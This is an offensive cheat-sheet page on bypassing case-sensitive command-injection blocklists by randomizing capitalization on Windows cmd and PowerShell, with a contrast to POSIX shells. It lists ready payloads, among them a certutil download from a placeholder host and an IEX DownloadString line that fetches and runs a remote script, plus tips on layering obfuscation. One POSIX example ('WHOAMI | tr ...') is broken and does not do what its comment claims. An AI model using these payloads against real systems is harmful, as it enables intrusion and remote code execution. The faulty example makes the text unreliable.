---
title: "Command injection filter bypass with random case"
description: "Evading case-sensitive blocklists by varying capitalization—wHoAmi, CeRTutil—where the interpreter is case-insensitive (Windows cmd, PowerShell) so the command still resolves; contrasted with case-sensitive POSIX."
keywords:
  - command injection
  - random case
  - case insensitive
  - filter bypass
  - windows cmd
  - powershell
---

# Random case

A blocklist written in one case—say it blocks `whoami`—is defeated by changing capitalization when the **interpreter resolves commands case-insensitively**. `wHoAmi` is not the string `whoami`, so a naive substring filter passes it, yet Windows `cmd.exe` and PowerShell execute it identically. The trick turns on a mismatch: the filter compares bytes, the shell folds case.

> **Scope.** For authorized penetration tests, red-team engagements, and CTF labs against systems you are contracted to assess. Executing commands without written authorization is unlawful.

## Why the interpreter normalizes it away

On Windows, command and executable name resolution is **case-insensitive**: the file system, `cmd.exe`, and PowerShell all treat `WHOAMI`, `whoami`, and `wHoAmi` as the same program. The blocklist inspects the literal request and sees `wHoAmi`, which does not equal the blocked `whoami`; it lets the request through. The shell then case-folds the name while locating the binary and runs it. The keyword the filter was protecting never appears in its expected case, but the command still resolves—the normalization happens in the interpreter's lookup, after the filter.

## Payloads (Windows)

Mixed case against a case-sensitive blocklist:

```
wHoAmi
WhOaMi
nEt UsEr
iPcOnFiG /aLl
cErTuTiL -UrLcAcHe -f http://OOB/x x.exe   # download via certutil
pOwErShElL -c "gEt-pRoCeSs"
```

PowerShell cmdlets, parameters, and operators are likewise case-insensitive:

```
IeX(nEw-ObJeCt NeT.wEbClIeNt).DoWnLoAdStRiNg('http://OOB/s.ps1')
gEt-CoNtEnT C:\Windows\win.ini
```

Combine with other Windows evasions—caret escaping in `cmd.exe` and case folding stack:

```
wh^oa^mi            # caret removed by cmd, case still folded
```

## POSIX is case-sensitive

On Linux/macOS shells, command resolution is **case-sensitive**: `WHOAMI` is not `whoami` and `PATH` lookup will not find it. Random case alone does **not** work against a POSIX sink—`cat` and `CAT` are different names. Reach the same goal with case-insensitive helpers instead:

```
$(tr "[A-Z]" "[a-z]" <<< "WHOAMI")       # downcase, then command substitution runs it
WHOAMI | tr "[:upper:]" "[:lower:]"      # only after folding does the name resolve
```

Because POSIX does not fold case for you, random case is properly a **Windows** technique; on POSIX, reserve it for arguments that a program parses case-insensitively, not for the command name.

## Operational notes

- Confirm the target OS and interpreter first: case folding is free on Windows `cmd`/PowerShell, unavailable for POSIX command names.
- Random case pairs well with caret escaping (`cmd`), backtick/quote insertion (PowerShell), and environment-variable assembly for layered obfuscation.
- The technique defeats only **case-sensitive** matching; a filter that lowercases input before comparing is unaffected, so vary the surrounding structure too.

## References

- [PayloadsAllTheThings: Command Injection — Bypass case sensitive](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [LOLBAS Project](https://lolbas-project.github.io/)
